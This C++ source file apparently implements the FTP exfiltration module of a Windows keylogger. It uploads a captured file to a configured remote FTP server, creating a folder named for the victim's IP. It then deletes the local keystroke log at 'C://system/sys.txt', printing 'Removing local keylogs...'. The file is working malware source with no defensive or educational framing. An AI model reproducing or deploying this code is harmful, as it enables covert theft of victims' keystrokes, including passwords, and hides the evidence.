#pragma comment (lib, "WinInet.lib")
#pragma comment (lib, "urlmon")

#include "ftp_comunication.h"

#include <iostream>
#include <Windows.h>
#include <WinInet.h>
#include <string>

bool ftp_comunication::send_file(const std::string & file_path, const std::string& file_name) 
{
    HINTERNET hInternet;
    HINTERNET hFtpSession;
    bool bRet = true;
    hInternet = InternetOpen(nullptr, INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
    if (hInternet == nullptr)
    {
        std::cerr << "Internet cant open " << GetLastError() << std::endl;
        return false;
    }
    else
    {
        hFtpSession = InternetConnectA(hInternet, m_host.c_str(), std::atoi(m_port.c_str()), m_user.c_str(), m_password.c_str(), INTERNET_SERVICE_FTP, 0, 0);

        if (hFtpSession == nullptr)
        {
            std::cerr << "ERROR  During Internet connction. Error number " << GetLastError() << std::endl;
            bRet = false;
        }
        else
        {
            std::string sFolderPath(m_directory);
            std::string sFileName(file_name);
            std::cout << "INFO  File name: " << sFileName << std::endl;
            std::cout << "INFO  Folder path: " << sFolderPath << std::endl;
            if (!folder_exists(sFolderPath.c_str()))
            {
                if (FtpCreateDirectoryA(hFtpSession, sFolderPath.c_str()))
                {
                    std::cout << "INFO  Created folder for IP " + sFolderPath << std::endl;
                }
                else
                {
                    std::cerr << "ERROR  creating folder " + sFolderPath << std::endl;
                    bRet = false;
                }
            }
            else
            {
                std::cout << "INFO  Folder already exists" << std::endl;
            }
            BOOL bSetDir = FtpSetCurrentDirectoryA(hFtpSession, sFolderPath.c_str());
            if (bSetDir)
            {
                std::cout << "INFO  Set directory to " << sFolderPath << std::endl;
            }
            else
            {
                std::cerr << "ERROR  Failed to set directory to " << sFolderPath << std::endl;
                bRet = false;
            }
            BOOL bTransfer = FtpPutFileA(hFtpSession, file_path.c_str(), sFileName.c_str(), FTP_TRANSFER_TYPE_BINARY, 0);
            if (!bTransfer)
            {
                std::cerr << "ERROR   Failed to send file." << std::endl;
                std::cerr << "ERROR   " << GetLastError() << std::endl;
                bRet = false;
            }
            else
            {
                std::cout << "INFO  Successfully sent file." << std::endl;
            }
            std::cout << "INFO  Closing FTP Session" << std::endl;
            InternetCloseHandle(hFtpSession); // Close hFtpSession
        }
    }
    std::cout << "INFO  Closing connection." << std::endl;
    InternetCloseHandle(hInternet); // Close hInternet
    std::cout << "INFO  Removing local keylogs..." << std::endl;
    remove("C://system/sys.txt");
    std::cout << "INFO  Done!" << std::endl;
    return bRet;
    return true;
}


bool ftp_comunication::folder_exists(const std::string & folder)
{
    IStream* stream = nullptr;
    std::string url = std::string(m_host) + std::string(m_user) + std::string(folder) + "/";
    URLOpenBlockingStreamA(0, url.c_str(), &stream, 0, 0);
    if (!stream) return false;
    stream->Release();
    return true;
}

ftp_comunication::ftp_comunication(const std::string& host, const std::string& port, const std::string& user, const std::string& password, const std::string& directory) :
//ftp_comunication(                const std::string&,      const std::string&,      const std::string&,      const std::string&,          const std::string&);
	  m_host(host),
      m_port(port),
      m_user(user),
      m_password(password),
      m_directory(directory)
{

}

ftp_comunication::~ftp_comunication() 
{
}